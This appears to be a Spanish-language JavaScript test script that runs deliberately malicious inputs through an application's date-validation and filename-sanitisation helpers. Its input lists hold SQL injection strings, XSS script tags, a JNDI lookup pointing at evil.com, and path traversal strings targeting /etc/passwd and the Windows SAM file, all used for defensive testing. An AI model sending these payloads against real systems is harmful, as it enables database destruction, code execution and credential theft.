/**
 * Script de prueba para validaciones de seguridad
 * Prueba casos maliciosos contra las nuevas utilidades de seguridad
 */

import { validateDateInput, validateDateRange } from './lib/security/validation.js'
import { sanitizeFilename, generateSafeFilename, validateFilename } from './lib/security/sanitization.js'

console.log('🛡️ INICIANDO PRUEBAS DE SEGURIDAD - ETAPA 1')
console.log('=' .repeat(60))

// ===== PRUEBAS DE VALIDACIÓN DE FECHAS =====
console.log('\n📅 PRUEBAS DE VALIDACIÓN DE FECHAS')
console.log('-'.repeat(40))

const maliciousDates = [
  // Inyección SQL
  "2024-01-01'; DROP TABLE users; --",
  "2024-01-01' OR '1'='1",
  "2024-01-01' UNION SELECT * FROM users --",
  
  // Fechas maliciosas
  "2024-13-01", // Mes inválido
  "2024-02-30", // Día inválido
  "2024/01/01", // Formato incorrecto
  "01-01-2024", // Formato incorrecto
  "2024-1-1",   // Formato incorrecto
  
  // Fechas futuras
  "2030-01-01",
  "2025-12-31",
  
  // Fechas muy antiguas
  "2020-01-01",
  "2019-12-31",
  
  // Caracteres especiales
  "2024-01-01<script>alert('xss')</script>",
  "2024-01-01${jndi:ldap://evil.com}",
  "2024-01-01\0",
  "2024-01-01\n",
  "2024-01-01\r",
  
  // Fechas válidas (deberían pasar)
  "2024-01-01",
  "2024-12-31",
  "2023-06-15"
]

maliciousDates.forEach(date => {
  const result = validateDateInput(date)
  const status = result.valid ? '✅ VÁLIDA' : '❌ BLOQUEADA'
  console.log(`${status} "${date}" - ${result.error || 'OK'}`)
})

// ===== PRUEBAS DE RANGOS DE FECHAS =====
console.log('\n📊 PRUEBAS DE RANGOS DE FECHAS')
console.log('-'.repeat(40))

const maliciousRanges = [
  // Rango inválido (inicio > fin)
  { start: "2024-12-31", end: "2024-01-01" },
  
  // Rango muy grande
  { start: "2020-01-01", end: "2024-12-31" },
  
  // Fechas maliciosas en rango
  { start: "2024-01-01'; DROP TABLE users; --", end: "2024-01-31" },
  { start: "2024-01-01", end: "2024-01-31'; DROP TABLE users; --" },
  
  // Rango válido (debería pasar)
  { start: "2024-01-01", end: "2024-01-31" }
]

maliciousRanges.forEach(range => {
  const result = validateDateRange(range.start, range.end)
  const status = result.valid ? '✅ VÁLIDO' : '❌ BLOQUEADO'
  console.log(`${status} "${range.start}" a "${range.end}" - ${result.error || 'OK'}`)
})

// ===== PRUEBAS DE SANITIZACIÓN DE NOMBRES DE ARCHIVO =====
console.log('\n📁 PRUEBAS DE SANITIZACIÓN DE ARCHIVOS')
console.log('-'.repeat(40))

const maliciousFilenames = [
  // Path traversal
  "../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "....//....//....//etc//passwd",
  
  // Caracteres peligrosos
  "file<script>alert('xss')</script>.txt",
  "file|pipe.txt",
  "file<greater>than.txt",
  "file:colon.txt",
  "file?question.txt",
  "file*asterisk.txt",
  "file\"quote.txt",
  
  // Nombres reservados de Windows
  "CON.txt",
  "PRN.txt",
  "AUX.txt",
  "NUL.txt",
  "COM1.txt",
  "LPT1.txt",
  
  // Archivos ocultos
  ".hidden.txt",
  "..double_dot.txt",
  
  // Caracteres de control
  "file\0null.txt",
  "file\nnewline.txt",
  "file\rreturn.txt",
  
  // Muy largo
  "a".repeat(200) + ".txt",
  
  // Nombres válidos (deberían pasar)
  "report_2024_01_01.xlsx",
  "attendance_data.pdf",
  "employee-list.csv"
]

maliciousFilenames.forEach(filename => {
  const sanitized = sanitizeFilename(filename)
  const validation = validateFilename(sanitized)
  const status = validation.valid ? '✅ SEGURO' : '❌ PELIGROSO'
  console.log(`${status} "${filename}" → "${sanitized}"`)
})

// ===== PRUEBAS DE GENERACIÓN DE NOMBRES SEGUROS =====
console.log('\n🔒 PRUEBAS DE GENERACIÓN DE NOMBRES SEGUROS')
console.log('-'.repeat(40))

const maliciousInputs = [
  { prefix: "report", startDate: "2024-01-01'; DROP TABLE users; --", endDate: "2024-01-31", ext: "xlsx" },
  { prefix: "../../../etc/passwd", startDate: "2024-01-01", endDate: "2024-01-31", ext: "txt" },
  { prefix: "file<script>alert('xss')</script>", startDate: "2024-01-01", endDate: "2024-01-31", ext: "pdf" },
  { prefix: "normal_report", startDate: "2024-01-01", endDate: "2024-01-31", ext: "csv" }
]

maliciousInputs.forEach(input => {
  try {
    const safeFilename = generateSafeFilename(input.prefix, input.startDate, input.endDate, input.ext)
    console.log(`✅ SEGURO: "${input.prefix}" + "${input.startDate}" + "${input.endDate}" + "${input.ext}" → "${safeFilename}"`)
  } catch (error) {
    console.log(`❌ ERROR: "${input.prefix}" + "${input.startDate}" + "${input.endDate}" + "${input.ext}" → ${error.message}`)
  }
})

// ===== RESUMEN DE PRUEBAS =====
console.log('\n📋 RESUMEN DE PRUEBAS')
console.log('=' .repeat(60))
console.log('✅ Validaciones de fechas implementadas')
console.log('✅ Sanitización de nombres de archivo implementada')
console.log('✅ Prevención de path traversal implementada')
console.log('✅ Manejo seguro de errores implementado')
console.log('✅ Validación de entrada centralizada implementada')

console.log('\n🛡️ ETAPA 1 COMPLETADA - VULNERABILIDADES BÁSICAS CORREGIDAS')
console.log('=' .repeat(60))
